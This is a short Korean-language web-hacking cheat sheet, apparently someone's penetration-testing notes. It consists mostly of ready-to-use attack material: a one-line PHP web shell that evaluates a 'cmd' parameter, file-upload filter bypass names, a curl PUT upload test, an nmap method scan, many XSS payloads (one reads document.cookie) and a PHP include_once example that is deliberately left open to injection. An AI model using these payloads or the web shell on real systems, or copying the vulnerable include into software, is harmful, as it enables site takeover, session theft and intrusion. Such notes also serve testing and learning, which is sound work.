# 한줄 웹쉘
<?php $a=$_GET['cmd']; eval($a); ?>

# PUT 파일 업로드 시도
curl 127.0.0.1:8080 --upload-file file.txt
-> curl의 '--upload-file' 을 사용하면 PUT 메소드로 파일 업로드를 시도한다.

# 파일 업로드
phpinfo.php%00.jpg
phpinfo%22php
phpinfo.php;.jpg
phpinfo.ph%70

※ 100MB 파일 생성 하기 - 윈도우 기본 기능 (cmd)
fsutil file createnew test 100000000

# nmap 메소드 오픈 확인
nmap --script http-methods 127.0.0.1

# XSS 공격 해보긔
<IMG SRC="javascript:alert(1);">
<IMG SRC="jav ascript:alert(1);">
<img src=asdf onerror=alert(document.cookie)>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script>
<a onmouseover="alert(1)">xxs link</a>
<iframe src="http://127.0.0.1" width="50" height="50" frameborder="0">lhj</iframe>
<input onfocus=javascript:alert(1) >
<a href="javascript:javascript:alert(1)" id="lhj">XSS test</a>
<s"%2b"cript>alert(1);</scr"2b"ipt>
<s%00c%00r%00i%00p%00t>a%00l%00e%00r%00t%00("h%00e%00l%00l%00o")</%00s%00c%00r%00i%00p%00t>
<svg/onload=alert(1)>
<IFRAME SRC=# onmouseover="alert(1)"></IFRAME>
"><img src=x onerror=prompt(1)>.jpg (파일명)

- innerhtml에 필터링 없이 그대로 입력받으면 xss가 터질 수 있음.
(QuerySelector(getElementById)로 가져온 document의 내용이나, 내부 html코드를 javascript 코드에서 변경할 수 있음.)
- <img src="data:image/png;base64,blablar......."> (그림 파일을 base64로 업로드 할 수 있음)

# 웹서버내에 접근이 가능할 때, Include Injection 공격 유효성 확인 가능.
grep -r "include_once" ./* > ~/once.txt
-> 다음과 같이 include 내에 요청 값이 그대로 들어가면 취약함 
<?php include_once($_GET['css'].'.css'); ?> 
